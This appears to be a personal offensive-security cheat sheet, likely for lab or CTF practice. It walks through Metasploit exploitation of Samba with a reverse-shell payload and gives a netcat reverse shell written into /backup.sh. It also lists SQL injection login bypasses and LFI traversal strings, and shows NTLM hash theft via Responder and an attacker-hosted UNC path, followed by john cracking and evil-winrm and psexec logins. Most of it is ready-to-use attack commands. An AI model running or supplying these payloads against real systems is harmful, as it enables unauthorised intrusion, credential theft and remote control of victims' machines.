# General exploitation

## Links
exploit-db.com
rapid7.com/db/modules/exploit
https://github.com/swisskyrepo/PayloadsAllTheThings


## seraching with searchsploit

```
seearchsploit <app>
```
example
```
searchsploit samba

searchsploit mod ssl 2
```

# Exploit with Metasploit
Using samba as an example


search for a codename of exploit or however it shows up in searchsploit
```
search trans2open
```
```
use exploit/linux/samba/trans2open
or 
use 1
```
```
set RHOST 192.168.1.4
```
```
msf5 > show targets
```
```
msf5 > exploit
```
IF IT KEEPS DYING TRY A DIFFERENT TYPE OF PAYLOAD
stageless vs staged
```
msf5 > options
```
```
msf5 > set payload linux/x86/shell_reverse_tcp
```
```
msf5 > exploit
```

# Manual

download exploit if you can find it on github or google

download, compile and run


shit to try:

```
echo '#!/bin/bash
nc -e /bin/bash 10.0.2.4 7337
"
' > /backup.sh
```

# SQL Injections
SQL Injection 101, Login tricks

    admin' --
    admin' #
    admin'/*
    ' or 1=1--
    ' or 1=1#
    ' or 1=1/*
    ') or '1'='1--
    ') or ('1'='1--
    ....

    Login as different user (SM*) 
    ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--

*Old versions of MySQL doesn't support union queries
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks

## getting around SQL
Show databases
```
show databses;
```
select a database
```
use <database name>
```
print tables
```
select * from <database>.<table>;
```

# Redis
geeting around Redis to print out keys
```
redis-cli - <ip or hostname> -p <port> -a <password if you know it>
```
printing all keys
```
select *
keys *
```
# LFI
always try to see if you can do any sort of lfi 
index.php?page="../../../../../../../../etc/hosts


# LFI on a windows machine
```
index.php?page="../../../../../../../../windows/system32/drivers/etc/hosts"
```

use repeater to see if you can connect back to a smb server youre running and grab the hash credentials
```
sudo responder -I tun0
```
then on the browser
```
http://<IP-or-HOST>/index.php?page=//<attaker-ip>/somefile
```
copy the `NTLMv2-SSP Hash` 
```
echo "Administrator ........0" > hash.txt
```
use john to crack the hash
```
sudo john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

# WINRM
connect using winrm
```
evil-winrm -i 10.129.56.226 -u Administrator -p password
```

# connecting to windows with credentials using psexec
```
python3 psexec.py administrator@{TARGET_IP}
```
